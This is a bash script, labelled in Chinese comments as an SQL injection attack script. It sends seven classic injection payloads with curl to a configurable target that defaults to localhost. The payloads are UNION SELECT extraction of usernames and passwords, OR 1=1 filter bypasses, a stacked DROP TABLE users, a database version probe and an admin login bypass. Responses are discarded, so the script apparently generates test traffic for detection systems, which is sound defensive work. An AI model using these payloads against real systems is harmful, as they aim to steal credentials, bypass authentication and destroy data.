#!/bin/bash
# SQL 注入攻击脚本
# 用法: TARGET=127.0.0.1:8080 ./sql_injection.sh

TARGET="${TARGET:-127.0.0.1:8080}"
echo "[SQL注入] 开始攻击 $TARGET ..."
sleep 1

echo "  [1/7] UNION SELECT 注入"
curl -s "http://$TARGET/login.php?id=1%20UNION%20SELECT%20username,password%20FROM%20users--" > /dev/null
sleep 0.3

echo "  [2/7] OR 1=1 绕过"
curl -s "http://$TARGET/search?q=%27%20OR%201=1--" > /dev/null
sleep 0.3

echo "  [3/7] OR '1'='1 绕过"
curl -s "http://$TARGET/product.php?id=1%27%20OR%20%271%27=%271" > /dev/null
sleep 0.3

echo "  [4/7] DROP TABLE 注入"
curl -s "http://$TARGET/report?sort=1;%20DROP%20TABLE%20users--" > /dev/null
sleep 0.3

echo "  [5/7] SELECT * FROM 探测"
curl -s -X POST "http://$TARGET/api/query" \
  -H "Content-Type: text/plain" \
  -d "SELECT * FROM admin WHERE id=1 UNION SELECT null,version()" > /dev/null
sleep 0.3

echo "  [6/7] ' OR 1=1 简单注入"
curl -s "http://$TARGET/item?id=1%27%20OR%201=1" > /dev/null
sleep 0.3

echo "  [7/7] POST 登录绕过"
curl -s -X POST "http://$TARGET/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin%27%20OR%201=1--&password=x" > /dev/null
sleep 0.3

echo "[SQL注入] 完成 (7 次攻击)"
